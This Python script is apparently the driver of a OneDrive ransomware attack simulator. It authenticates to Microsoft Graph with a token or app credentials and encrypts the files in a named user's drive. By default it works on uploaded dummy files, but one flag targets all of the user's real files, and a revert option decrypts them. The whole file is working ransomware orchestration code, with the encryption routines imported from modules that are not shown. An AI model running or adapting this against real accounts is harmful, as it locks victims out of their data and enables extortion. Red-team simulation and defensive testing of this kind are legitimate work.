from ransomware_utils.onedrive_objects import OneDriveFileItem
from ransomware_utils.onedrive_ransomware import OneDriveRansomware
from ransomware_utils.msgraph_objects import MicrosoftGraphAPI
import argparse
import os

DUMMY_FILESYSTEM_PATH = 'ransomware_tests'


def upload_dummy_filesystem(local_path, graph_session):
    for root, dirs, files in os.walk(local_path):
        if len(root.rsplit(os.path.sep, 1)) > 1:
            folder_path, folder_name = root.rsplit(os.path.sep, 1)
            graph_session.create_folder(folder_name=folder_name, parent_folder_id=graph_session.get_folder_id_by_path(folder_path),  modify_if_exists=False)
        else:
            graph_session.create_folder(folder_name=root, parent_folder_id=graph_session.get_root_folder_id(), modify_if_exists=False)

        # Upload files to the current folder
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                graph_session.create_file(file_path, f.read())


def get_target_onedrive_items(onedrive_session: MicrosoftGraphAPI, stating_folder_item_id):
    all_onedrive_files_to_encrypt = []
    root_folder = onedrive_session.get_folder_item(stating_folder_item_id)
    all_onedrive_items = onedrive_session.list_children_recursively(root_folder)
    items_to_encrypt = [item for item in all_onedrive_items if isinstance(item, OneDriveFileItem)]
    all_onedrive_files_to_encrypt.extend(items_to_encrypt)

    return all_onedrive_files_to_encrypt


def parse_args():
    parser = argparse.ArgumentParser(description="OneDrive ransomware attack simulator")
    parser.add_argument("--target-user", help="Provide the name of the targeted user", required=True)
    parser.add_argument("--start-ransomware", help="Start a ransomware attack by encrypting all the remote files", action="store_true")
    parser.add_argument("--revert-ransomware", help="Revert a ransomware attack by decrypting all the remote files", action="store_true")
    parser.add_argument("--generate-key", action='store_true', help="When specified, a new key will be generated. \
                                                    Otherwise, a key will be read from the key path", default=False)
    parser.add_argument("--use-user-native-files", action='store_true', help="When specified, the tool will directly "
                                                                        "encrypt/decrypt the files the user's drive", default=False)
    parser.add_argument("--key-path", default="./config/key.txt", help="Path to symmetric encryption/decryption key./"
                                                                       "default: ./config/key.txt")
    parser.add_argument("--token-path", default="./config/token.txt", help="Path to the JWT token. default: ./config/token.txt")
    parser.add_argument("--tenant-id", help="Tenant ID of application for token generation")
    parser.add_argument("--client-id", help="Client ID of application for token generation")
    parser.add_argument("--client-secret", help="Client secret of application for token generation")
    parser.add_argument("--encrypted-file-extension", default=".enc", help="The extension of the encrypted files. default: .enc")
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    graph_session = MicrosoftGraphAPI()

    if args.tenant_id and args.client_id and args.client_secret:
        try:
            access_token = graph_session.generate_access_token(tenant_id=args.tenant_id,
                                                               client_id=args.client_id,
                                                               client_secret=args.client_secret)
        except Exception:
            print("Could not generate a token using the provided tenant ID and client ID and client secret.")
            exit(1)

    elif args.token_path:
        try:
            with open(args.token_path, "r") as f:
                access_token = f.read()
        except Exception as e:
            raise Exception(f"Something went wrong while reading the token: {e}")

    graph_session.login_using_token(access_token)
    try:
        graph_session.set_user_drive_id(user_id=args.target_user)
    except Exception as e:
        print("Something when wrong when getting the user's drive ID. Either the token is invalid/insufficient,"
              "or the user doesn't exist.")
        raise e

    if args.start_ransomware:
        onedrive_ransomware = OneDriveRansomware(graph_session, args.key_path)
        all_onedrive_files_to_encrypt = []
        if not args.use_user_native_files:
            print("Uploading dummy files")
            upload_dummy_filesystem(DUMMY_FILESYSTEM_PATH, graph_session)
            print("Done uploading dummy files")
            all_onedrive_files_to_encrypt = get_target_onedrive_items(graph_session, DUMMY_FILESYSTEM_PATH)
        else:
            all_onedrive_files_to_encrypt = get_target_onedrive_items(graph_session, '')
        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, args.encrypted_file_extension, args.generate_key)

    if args.revert_ransomware:
        onedrive_ransomware = OneDriveRansomware(graph_session, args.key_path)
        if not args.use_user_native_files:
            all_onedrive_files_to_decrypt = get_target_onedrive_items(graph_session, DUMMY_FILESYSTEM_PATH)
        else:
            all_onedrive_files_to_decrypt = get_target_onedrive_items(graph_session, '')
        onedrive_ransomware.revert_ransomware(all_onedrive_files_to_decrypt, args.encrypted_file_extension)


if "__main__" == __name__:
    main()
